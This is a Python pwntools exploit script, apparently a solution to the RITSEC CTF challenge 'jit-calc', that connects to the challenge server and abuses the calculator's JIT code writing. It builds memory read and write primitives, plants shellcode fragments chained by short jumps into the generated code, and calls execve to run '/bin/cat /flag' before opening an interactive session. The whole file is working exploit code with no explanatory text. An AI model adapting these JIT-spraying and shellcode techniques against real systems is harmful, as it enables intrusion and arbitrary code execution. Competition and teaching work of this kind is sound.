#!/usr/bin/python

from pwn import *

context.clear(arch='amd64')

e = ELF("./jit-calc")
l = e.libc
#p = process("./jit-calc")
p = remote("ctfchallenges.ritsec.club", 8000)

def change_idx(idx):
    p.recv() #("code\n")
    p.sendline("1")
    p.recv() #("(0-9)\n")
    p.sendline(str(idx))

def write_mode():
    p.recv() #("code\n")
    p.sendline("2")

def write_ret():
    p.recv() #("Value\n")
    p.sendline("1")

def write_add(cond):
    p.recv() #("Value\n")
    p.sendline("2")
    p.recv() #("4: Add Register 2 to Register 2\n")
    p.sendline(str(cond))

def write_mov(reg, value):
    p.recv() #("Value\n")
    p.sendline("3")
    p.recv() #("register 2\n")
    p.sendline(p8(reg))
    p.recv() #("constant:\n")
    p.sendline(str(value))

def run_code():
    p.recv() #("code\n")
    p.sendline("4")
    leak = p.recv()
    leak = leak[leak.find("Result: ")+len("Result: "):]
    leak = leak[:leak.find("\n")]
    try:
        return int(leak, 16)
    except:
        return 0

def leak(addr):

    code = u64(asm("mov rax, [rbx]").rjust(7,"\x90") + "\xc3")

    write_mode()
    write_mov(2, 0)
    write_mov(2, 0)
    prog = log.progress("filling...")
    for i in xrange(0x141):
        #prog.status("count = 0x%x", i)
        write_add(3)
    prog.success("filled")
    write_mov(2, code)

    write_mode()
    prog = log.progress("filling...")
    for i in xrange(0x145):
        #prog.status("count = 0x%x", i)
        write_add(3)
    prog.success("filled")
    write_mov(2, addr)

    return run_code()

def copy(addr, value):

    code = asm("mov QWORD PTR [rbx], rax")
    code = u64(code.ljust(7, "\x90") + "\xc3")

    p.sendline("2")
    prog = log.progress("filling...")
    for i in xrange(98):
        write_mov(2, 0)
    write_add(3)
    prog.success("filled")
    write_mov(2, code)

    write_mode()
    prog = log.progress("filling...")
    for i in xrange(95):
        write_mov(1, 0)
    for i in xrange(5):
        write_add(3)
    prog.success("filled")
    write_mov(1, value)
    write_mov(2, addr)

    run_code()

def shell():

    code = "\xe9" + p32(0xffffffad)
    code = u64(code.ljust(8, "\x90"))

    p.sendline("2")
    prog = log.progress("filling...")
    for i in xrange(98):
        write_mov(2, 0)
    write_add(3)
    prog.success("filled")
    write_mov(2, code)

    write_mode()
    prog = log.progress("filling...")
    for i in xrange(89):
        write_mov(1, 0)
    for i in xrange(5):
        write_add(3)
    prog.success("filled")

    codes = [
        asm("mov rdi, rbx")  + "\xeb\x05",
        asm("mov rsi, rbx")  + "\xeb\x05",
        asm("add rsi, 0x20") + "\xeb\x05",
        asm("xor rdx, rdx")  + "\xeb\x05",
        asm("mov al, 0x3b")  + "\xeb\x06",
        asm("syscall")
    ]       
    write_mov(1, u64(codes[0].ljust(8, "\x90")))
    write_mov(1, u64(codes[1].ljust(8, "\x90")))
    write_mov(1, u64(codes[2].ljust(8, "\x90")))
    write_mov(1, u64(codes[3].ljust(8, "\x90")))
    write_mov(1, u64(codes[4].ljust(8, "\x90")))
    write_mov(1, u64(codes[5].ljust(8, "\x90")))
    write_mov(1, 0)
    write_mov(2, e.bss(0x100))

copy(e.bss(0x100), u64("/bin/cat"))
copy(e.bss(0x110), u64("/flag".ljust(8, "\x00")))
copy(e.bss(0x120), e.bss(0x100))
copy(e.bss(0x128), e.bss(0x110))
shell()

p.sendline("4")

p.interactive()